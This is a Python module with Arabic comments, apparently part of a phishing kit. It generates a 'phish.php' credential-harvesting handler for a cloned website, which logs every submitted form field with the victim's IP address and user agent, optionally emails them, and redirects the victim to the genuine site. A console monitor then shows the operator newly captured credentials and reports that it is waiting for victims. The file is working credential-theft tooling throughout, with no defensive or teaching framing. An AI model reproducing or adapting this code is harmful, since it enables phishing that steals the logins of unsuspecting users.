#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
نظام حصد البيانات وعرضها والاحتفاظ بها
"""

import os
import time
from datetime import datetime
from colorama import init, Fore, Style

# تهيئة colorama للألوان في الطرفية
init(autoreset=True)

class Harvester:
    """
    الفئة المسؤولة عن مراقبة وحصد البيانات
    """
    
    def __init__(self, log_file):
        """
        تهيئة الحاصد
        
        Args:
            log_file: مسار ملف السجل
        """
        self.log_file = log_file
        self.last_position = 0
        
    def create_phish_php(self, output_dir):
        """
        إنشاء ملف PHP للحصد
        
        Args:
            output_dir: مجلد الموقع المستنسخ
        """
        php_code = '''<?php
// ملف حصد البيانات - Phishing Handler

// استقبال جميع البيانات المرسلة
$data = "";
foreach ($_POST as $key => $value) {
    $data .= "$key: $value\\n";
}

// إضافة معلومات إضافية
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

$log_entry = "[$timestamp]\\n";
$log_entry .= "IP: $ip\\n";
$log_entry .= "User-Agent: $user_agent\\n";
$log_entry .= "Data:\\n$data\\n";
$log_entry .= str_repeat("-", 50) . "\\n";

// حفظ في ملف
$log_file = 'logs/harvested_data.txt';
$dir = dirname($log_file);
if (!is_dir($dir)) {
    mkdir($dir, 0755, true);
}
file_put_contents($log_file, $log_entry, FILE_APPEND);

// إرسال إيميل (اختياري - عدل البريد)
// mail("your_email@example.com", "New Credentials", $log_entry);

// إعادة التوجيه إلى الموقع الحقيقي
if (isset($_POST['original_url'])) {
    header('Location: ' . $_POST['original_url']);
} else {
    header('Location: https://www.google.com');
}
exit;
?>
'''
        
        php_path = os.path.join(output_dir, 'phish.php')
        with open(php_path, 'w') as f:
            f.write(php_code)
        
        # إنشاء مجلد logs
        logs_dir = os.path.join(output_dir, 'logs')
        os.makedirs(logs_dir, exist_ok=True)
        
        print(f"[✓] تم إنشاء ملف الحصد: {php_path}")
        
    def monitor(self):
        """
        مراقبة ملف السجل وعرض البيانات الجديدة
        """
        print(f"\n{Fore.GREEN}[*] بدء مراقبة البيانات...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] الملف: {self.log_file}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] في انتظار دخول الضحايا...{Style.RESET_ALL}\n")
        
        while True:
            try:
                if os.path.exists(self.log_file):
                    with open(self.log_file, 'r') as f:
                        f.seek(self.last_position)
                        new_data = f.read()
                        
                        if new_data:
                            # عرض البيانات بشكل منظم
                            print(f"\n{Fore.RED}{'='*60}{Style.RESET_ALL}")
                            print(f"{Fore.GREEN}[+] تم حصد بيانات جديدة!{Style.RESET_ALL}")
                            print(f"{Fore.YELLOW}{new_data}{Style.RESET_ALL}")
                            print(f"{Fore.RED}{'='*60}{Style.RESET_ALL}\n")
                            
                            # تحديث الموضع
                            self.last_position = f.tell()
                            
                time.sleep(2)  # انتظار ثانيتين قبل الفحص التالي
                
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[*] إيقاف المراقبة...{Style.RESET_ALL}")
                break
            except Exception as e:
                print(f"{Fore.RED}[!] خطأ في المراقبة: {e}{Style.RESET_ALL}")
                time.sleep(5)
    
    def show_all_logs(self):
        """
        عرض جميع البيانات المحفوظة
        """
        if os.path.exists(self.log_file):
            print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}جميع البيانات المحفوظة:{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
            
            with open(self.log_file, 'r') as f:
                print(f.read())
        else:
            print(f"{Fore.YELLOW}[!] لا توجد بيانات محفوظة بعد{Style.RESET_ALL}")
